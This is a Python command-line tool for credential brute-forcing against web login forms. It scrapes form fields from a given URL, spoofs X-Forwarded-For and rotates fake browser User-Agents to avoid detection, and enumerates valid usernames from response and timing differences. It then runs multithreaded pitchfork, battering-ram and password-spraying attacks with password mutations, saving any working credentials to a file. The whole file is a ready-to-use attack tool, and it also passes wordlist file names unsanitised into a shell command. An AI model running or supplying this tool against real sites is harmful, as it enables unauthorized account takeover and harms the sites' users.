import random
import sys
import requests
import os
import threading
import re
import time
import builtins
from string import *

# define target url, change as needed
# received from sys.args
url = ""

# throthling to avoid the overhead on our PC
max_threads = 1000

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Forwarded-For": "127.0.0.1"
    }

useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36"
    ]

# base response to compare changements on the page in case the response size does not change
base_response = ""

method= ""

aceptable_status_codes = [200, 301, 302, 403]

# the main lists of users and passwords
usernames = list()

passwords = list()

# keeps track of the already used creds
used_creds = list()

# the post parameters to send
user_param = ""

pass_param = ""

submit_param = {
    "name": "",
    "value": ""
}

# used to count for errors and exit upon many errors. cases like lost connection or banned ip
errors = 0

# used to let the main program know that a thread found some creds
exiting = False

# used to let the main program know that a thread found a valid user
user_found = False

# used to try pitchfork attack using this password
valid_user = ""

# used to validate usernames based on response times
max_response_time_seconds = 0
valid_user_inicator_seconds = 0.2
time_based_usernames = list()

policies = {
    "lower" : False,
    "upper" : False,
    "digits" : False,
    "chars" : [],
    "length" : 0
}
check_policy = False

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, username, password):
    req_headers = headers
    req_headers["User-Agent"] = return_user_agent()

    data = {
        user_param:username,
        pass_param:password,
        submit_param["name"]: submit_param["value"]
        }

    if (method == "POST"):       
        res = requests.post(url, headers=req_headers, data=data)
    elif (method == "GET"):
        params = list()
        keys = list(data.keys())

        for key in keys:
            params.append(key + "=" + str(data[key]))

        url += "?" + "&".join(params)
        res = requests.get(url, headers=req_headers)

    if(res.status_code not in aceptable_status_codes):
        print("[-] Unable to connect, response [{}].".format(res.status_code))
        exit()

    return res


"""
returns a random User-Agent
"""
def return_user_agent():
    return useragents[random.randrange(0, len(useragents))]


"""
gets the base response from the server when using invalid creds
"""
def heat_bf(url, username="invalid_user", requests=20):
    global errors
    global base_response
    global max_response_time_seconds

    for i in range(0, requests):
        try:
            res = do_req(url, username, "invalid_passwd")

            if (len(res.text) > 0):            
                base_response = res.text
                response_time = res.elapsed.total_seconds()
                if (response_time > max_response_time_seconds):
                    max_response_time_seconds = response_time
        except Exception as e:            
            if (errors < 1):
                print("[-] {}".format(e))
            errors += 1
            if (errors > 4):
                print("[-] Unable to connect.")
                exit()
            continue


"""
check for valid username information disclosure on the page
"""
def check_valid_user():
    thread_list = list()
    temp_usernames = list(set(usernames))

    print("*" * 50)
    print("[!] Checking for valid user information disclosure")
    print("[!] Checking {} unique usernames".format(len(temp_usernames)))

    count = 0

    for username in temp_usernames:
        if user_found:
            break        
        try:
            thread = threading.Thread(target=thread_check_valid_user, args=(username, ))
            thread_list.append(thread)
            thread.start()
            count += 1
        except Exception as e:            
            if (errors < 1):
                print("[-] {}".format(e))
            errors += 1
            if (errors > 4):
                print("[-] Unable to connect.")
                exit()
            continue 
        if (count >= max_threads):
            threads_join(thread_list)
            count = 0
            thread_list.clear()
    threads_join(thread_list)
    if not user_found:
        if (len(time_based_usernames) > 0):
            print("[+] Recommended time-based found usernames.")
            for username in time_based_usernames:
                print(username)
        print("[-] Site not vulnerable to valid username information disclosure or usenames not in wordlist.")


"""
handler function to be used with multi thread
"""
def thread_check_valid_user(username):
    global user_found
    global valid_user
    global base_response
    global time_based_usernames

    res = do_req(url, username, "invalid_passwd")
    response = res.text 
    response_time = res.elapsed.total_seconds() - valid_user_inicator_seconds
    
    if ((base_response.replace("invalid_user", username) != response) and (not user_found)):
        print("[+] Valid username found. [{}]".format(username))
        valid_user = username
        user_found = True
        base_response = response
        return
    
    if ((response_time >= max_response_time_seconds) and (not user_found)):
        heat_bf(url, requests=5)
        if (response_time >= max_response_time_seconds):
            time_based_usernames.append(username)

"""
launch bruteforce atack
"""
def bruteforce_creds(username, passwod):
    global used_creds
    global errors

    if ((username, passwod) in used_creds):
        return
    used_creds.append((username, passwod))
    # call do_req() to do the HTTP request
    try:
        res = do_req(url, username, passwod)

        response = res.text

        if (base_response.replace("invalid_user", username) != response):
            print("*" * 50)
            print("[+] Valid account found: [{}:{}]".format(username, passwod))
            with open("bruteforce_results", "wt") as f:
                f.write("{}:{}".format(username, passwod))
                f.close()
            exit()
    except Exception as e:
        if (errors < 1):
            print("[-] {}".format(e))
        errors += 1
        if (errors > 4):
            print("[-] Unable to connect.")
            exit()    


"""
Search for login parameters on the page
"""
def check_parameters():
    global user_param
    global pass_param
    global submit_param
    global method

    print("[!] Checking FORM parameters.")

    try:
        res = requests.get(url, headers=headers)
        data = res.text
    except Exception as e:
        print("[-] ", e)
        exit()

    inputs = list()
    data = data.replace("\n", " ")

    # get parameters
    raw_inputs = re.findall('<input(.*?)>', data)
    for input in raw_inputs:
        inputs += re.findall('name="(.*?)"', input)

    # get method
    raw_inputs = re.findall('<form(.*?)>', data)
    if (len(raw_inputs) == 1):
        methods = re.findall('method="(.*?)"', raw_inputs[0])
        if (len(methods) > 0):
            method = methods[0].upper()

    # get submit parameter
    # <button value="answer" name="submit" type="submit" class="btn btn-primary btn-block">Submit</button>
    raw_inputs = re.findall('<button(.*?)>', data)
    if (len(raw_inputs) >= 1):
        for raw_input in raw_inputs:
            type = re.findall('type="(.*?)"', raw_input)
            if (type != "submit"):
                continue
            submit_param["name"] = re.findall('name="(.*?)"', raw_input)
            submit_param["value"] = re.findall('value="(.*?)"', raw_input)
        

    if ((len(inputs) < 2)):
        print("[-] No Form parameters found.")
        exit()

    if ((method != "POST") and (method != "GET")):
        print("[-] No Form method found.")
        exit()

    for input in inputs:
        if ("user" in input.lower()) and (user_param == ""):
            user_param = input
        if ("pass" in input.lower()):
            pass_param = input

    print("[+] Form paramaters: {}, {}.".format(user_param, pass_param))
    print("[+] Form method: {}.".format(method))


"""
create and test mutations on the passwords in order to get some possible variations
"""
def handle_mutations():
    thread_list = list()

    mutate_passwords()

    userns = len(usernames)
    passwds = len(passwords)

    combinations = userns * passwds * 2 + userns * userns + passwds * passwds

    print("*" * 50)
    print("[!] Trying mutations on passwords. . Password Spraying Mode")
    print("[!] {} combinations to test.".format(combinations))

    sec = round(combinations / max_threads)
    ty_res = time.gmtime(sec)
    res = time.strftime("%H:%M:%S",ty_res)
    print("[!] Estimated time: {} to try everything.".format(res))

    count = 0

    for passw in passwords:
        for user in usernames:
            try:
                if exiting:
                    break               
                thread = threading.Thread(target=bruteforce_creds, args=(user, passw))
                thread.start()
                thread_list.append(thread)
                count += 1
            except:
                continue 

            if (count >= max_threads):
                threads_join(thread_list)
                count = 0
                thread_list.clear()
    threads_join(thread_list)   
    if exiting:
        exit()
    

"""
adds the mutations to the passwords list
"""
def mutate_passwords():
    global passwords
    passwords = list(set(passwords))
    pass_mutations = list()
    for passw in passwords:
        pass_mutations += apply_mutation(passw)
    passwords += pass_mutations
    passwords = list(set(passwords))


"""
create the mutations
"""
def apply_mutation(word):
    if (word == "") or (word == " "):
        return list(word)

    mutations = list()

    try:
        mutation = word.capitalize()
        if (mutation != word):
            mutations.append(mutation)

        mutation = word.lower()
        if (mutation != word):
            mutations.append(mutation)

        mutation = word.upper()
        if (mutation != word):
            mutations.append(mutation)

        return mutations 
    except:
        return list(word)


"""
handler to apply .join in a threads of some list
"""
def threads_join(thread_list):
    for thread in thread_list:
        thread.join()


"""
prints the completed percentage of the main lists combinations
"""
def check_percent_completed(combinations, total_count):
    if (total_count == combinations * 0.1):
        print("[-] 10% Checked.")
    elif (total_count == combinations * 0.5):
        print("[-] 50% Checked.")
    elif (total_count == combinations * 0.75):
        print("[-] 75% Checked.")
    elif (total_count == combinations * 0.95):
        print("[-] 95% Checked.")


"""
helps to parse passwords from the wordlist file
"""
def parse_passwords(fline):
    global passwords
    password = fline.replace("\n", "")
    if ((password != " ") and (password != "")):
        password = password.strip()
    
    if check_policy and not check_policy_compliant(password): return
    passwords.append(password)


"""
helps to parse usernames from the wordlist file
"""
def parse_usernames(fline):
    global usernames
    username = fline.replace("\n", "")
    if ((username != " ") and (username != "")):
        username = username.strip()
    usernames.append(username)


"""
opens file and recover passwords from a given wordlist, if is not a file,
use the passed arg as username value (useful when user is recovered using OSINT)
"""
def parse_passwords_wordlist():
    pfname = sys.argv[2]
    if (os.path.isfile(pfname)):        
            # open the file, this is our passwords wordlist
        with open(pfname, "r", encoding='utf-8') as fh:
            # read file line by line
            print("[!] Checking passwords.")

            max = int(os.popen("cat {} | wc -l".format(pfname)).read()) + 1
            for i in range(0, int(max)):                
                try:
                    parse_passwords(fh.readline())
                except:
                    continue
            fh.close()
        # if it is not a file, use it as password
    else:
        print("[!] Using {} as the only password".format(pfname))
        parse_passwords(pfname)


"""
opens file and recover users from a given wordlist, if is not a file,
use the passed arg as password value (useful for pasword spraying attack)
"""
def parse_users_wordlist():
    ufname = sys.argv[1]
    if (os.path.isfile(ufname)):
            # open the file, this is our users wordlist
        with open(ufname) as fh:
                # read file line by line
            print("[!] Checking users.")

            max = int(os.popen("cat {} | wc -l".format(ufname)).read()) + 1
            for i in range(0, int(max)):                
                try:
                    parse_usernames(fh.readline())
                except:
                    continue
            fh.close()
        parse_usernames("User{}".format(10))
        parse_usernames("User{}".format(101))
        parse_usernames("User{}".format(1001))
        
        # if it is not a file, use it as username
    else:
        print("[!] Using {} as the only username".format(ufname))
        parse_usernames(ufname)


"""
mimics burp suite battering ram attack
"""
def battering_ram_attack():
    global usernames
    global passwords
    if (user_found):
        usernames = [valid_user]
    usernames = list(set(usernames))
    passwords = list(set(passwords))

    combinations = len(usernames) * len(passwords)
    
    print("*" * 50)
    print("[!] Launching Battering Ram Attack. Password Spraying Mode")
    print("[!] {} unique combinations in wordlist.".format(combinations))

    # estimate an inexact time based on the max_active threads
    sec = round(combinations / max_threads)
    ty_res = time.gmtime(sec)
    res = time.strftime("%H:%M:%S",ty_res)
    print("[!] Estimated time: {} to try everything.".format(res))

    thread_list = list()
    count = 0
    # used to calculate the percentage of job that is already done
    total_count = 0

    for password in passwords:    
        if exiting:
            break
        for username in usernames:
            if exiting:
                break
            # used to calculate and show the percentage of job that is already done
            total_count += 1
            check_percent_completed(combinations, total_count)

            thread = threading.Thread(target=bruteforce_creds, args=(username, password))
            thread.start()
            thread_list.append(thread)
            count += 1

            if (count >= max_threads):
                threads_join(thread_list)
                count = 0
                thread_list.clear()
    threads_join(thread_list)
    if exiting:
        exit()


"""
mimics burp suite pitchfork attack, these attacks will be deduced from battering ram later
"""
def pitfork_attack():
    combinations = 0

    temp_usernames = usernames

    if user_found:
        temp_usernames = [valid_user]

    len_usernames = len(temp_usernames)
    len_passwords = len(passwords)


    if (len_usernames <= len_passwords):
        combinations = len_usernames
    else:
        combinations = len_passwords

    print("*" * 50)
    print("[!] Launching Pitchfork Attach")
    print("[!] {} original combinations in wordlist.".format(combinations))

    # estimate an inexact time based on the max_active threads
    sec = round(combinations / max_threads)
    ty_res = time.gmtime(sec)
    res = time.strftime("%H:%M:%S",ty_res)
    print("[!] Estimated time: {} to try everything.".format(res))

    thread_list = list()
    count = 0
    # used to calculate the percentage of job that is already done
    total_count = 0

    for i in range(0, combinations):
        if exiting:
            break
        # used to calculate and show the percentage of job that is already done
        total_count += 1
        check_percent_completed(combinations, total_count)

        if ((user_found) and (temp_usernames[i]) != valid_user):
            continue

        thread = threading.Thread(target=bruteforce_creds, args=(temp_usernames[i], passwords[i]))
        thread.start()
        thread_list.append(thread)
        count += 1

        if (count >= max_threads):
            threads_join(thread_list)
            count = 0
            thread_list.clear()
    threads_join(thread_list)
    if exiting:
        exit()


"""
custom exit function to make threads stop their parent loop
"""
def exit():
    global user_found
    global exiting

    user_found = True
    exiting = True
    builtins.exit()


"""
check for the different policies applicable to the passwords based on an example password
"""
def check_policies_enabled(policy_template):
    global check_policy
    global policies

    print("[!] Creating password policy from [{}].".format(policy_template))

    check_policy = True
    policies["length"] = len(policy_template)
    print("[!] Minimum {} characters.".format(len(policy_template)))
    for chr in policy_template:
        if chr in ascii_lowercase:            
            if not policies["lower"]: 
                print("[!] Required lowercases.")
            policies["lower"] = True
        elif chr in ascii_uppercase:
            if not policies["upper"]:
                print("[!] Required UPPERCASE.")
            policies["upper"] = True
        elif chr in digits:
            if not policies["digits"]:
                print("[!] Required d1g1ts.")
            policies["digits"] = True
        elif chr in punctuation:
            if len(policies["chars"]) < 1:
                print("[!] Required ch@rs.")
            policies["chars"].append(chr)
        else:
            print("[-] The template contains invalid characters")
            exit()
    print("[+] Policy Created.")


"""
check if some string is a password policy compliant
"""
def check_policy_compliant(password):
    if (len(password) < policies["length"]): return False

    lower = False
    upper = False
    digit = False
    chars = False

    for chr in password:
        if (policies["lower"] and chr in ascii_lowercase):
            lower = True
        elif (policies["upper"] and chr in ascii_uppercase):
            upper = True
        elif (policies["digits"] and chr in digits):
            digit = True
        elif chr in policies["chars"]:
            chars = True
        else:
            return False

    if (policies["lower"] and not lower):
        return False
    elif (policies["upper"] and not upper):
        return False
    elif (policies["digits"] and not digit):
        return False
    elif ((len(policies["chars"]) > 0) and not chars):
        return False
    else:
        return True


"""
main application function
"""
def main():    
    global headers

    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 3):
        global url
        url = sys.argv[3]

        try:
            policy_template = sys.argv[4]
            check_policies_enabled(policy_template)
        except:
            print("[!] Not password policy entered.")
        domain = ""

        headers["X-Forwarded-For"] = "127.0.0.1"

        # if the argument provided as users wordlist path is a file, get the users from it
        parse_users_wordlist()

        # if the argument provided as passwords wordlist path is a file, get the passwords from it
        parse_passwords_wordlist()

        print("[!] {} users and {} passwords found on wordlists.".format(len(usernames), len(passwords)))
    else:
        print("[-] Please check wordlist.")
        print("[!] Usage: python3 {} /path/to/users_wordlist /path/to/pass_wordlist http://www.example.com/login.php P@ssw0rd_P0l1cy_Ex@mpl3".format(sys.argv[0]))
        print("[!] Password Policy is optional. We need to pass a template for the Policy checker")
        exit()
	
    # scraps login parameters from the page
    check_parameters()

    # prepare the program to respond to text content changes on the response
    heat_bf(url)
    # ---------------------------------end program preparations------------------------------------#

    # check for valid uername first from an informtion disclosure vulnerablity
    check_valid_user()

    # ---------------------------------bruteforce using actual wordlists data (Pitchfork Attack)------------------------------------#
    pitfork_attack()
    # ---------------------------------ends bruteforcing passwords using actul wordlists data------------------------------------#
    # get unique usernames and passwords to reduce combinations to test
    battering_ram_attack()
    # ---------------------------------ends bruteforcing passwords------------------------------------#
    
    # ---------------------------------bruteforcing mutations on passwords (last resource)------------------------------------#
    handle_mutations()          

    print("[-] No credentials found with this wordlists.")


if __name__ == "__main__":
    main()
